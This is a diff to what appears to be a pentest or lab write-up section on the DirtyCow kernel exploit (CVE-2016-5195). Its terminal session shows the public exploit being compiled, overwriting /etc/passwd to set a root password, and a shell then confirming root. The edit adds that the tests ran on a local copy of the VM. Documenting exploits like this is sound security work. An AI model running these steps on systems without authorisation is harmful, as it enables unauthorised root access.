@@ -574,25 +574,24 @@ root@srv-99-590:/var/www/html#
 ```
 
 
-### Method 4 - DirtyCow
+### Method 4 - DirtyCow (CVE-2016-5195)
 - This is a well known kernel exploit that originated back in 2016
-- Below is a PoC using exploit code from github user gibonacini (https://github.com/gbonacini/CVE-2016-5195)
+- Below is a PoC using exploit code from github user gibonacini (https://github.com/gbonacini/CVE-2016-5195) 
 - The specific exploit used here overwrites the /etc/passwd file to replace the root password
-- 
-
+- For clarity, these PoCs are being performed on an identical VM running locally - not the main victim machine. This is to ensure I don't unintentionally crash the victim machine.
 ```
-ubuntu@kernel-explout-tests:~/CVE-2016-5195$ make
+ubuntu@kernel-exploit-tests:~/CVE-2016-5195$ make
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
 ubuntu@kernel-explout-tests:~/CVE-2016-5195$ ./dcow
 Running ...
 Received su prompt (Password: )
 Root password is:   dirtyCowFun
 Enjoy! :-)
-ubuntu@kernel-explout-tests:~/CVE-2016-5195$ su -
+ubuntu@kernel-exploit-tests:~/CVE-2016-5195$ su -
 Password:
-root@kernel-explout-tests:~# whoami
+root@kernel-exploit-tests:~# whoami
 root
-root@kernel-explout-tests:~# id
+root@kernel-exploit-tests:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@kernel-explout-tests:~#
 ```
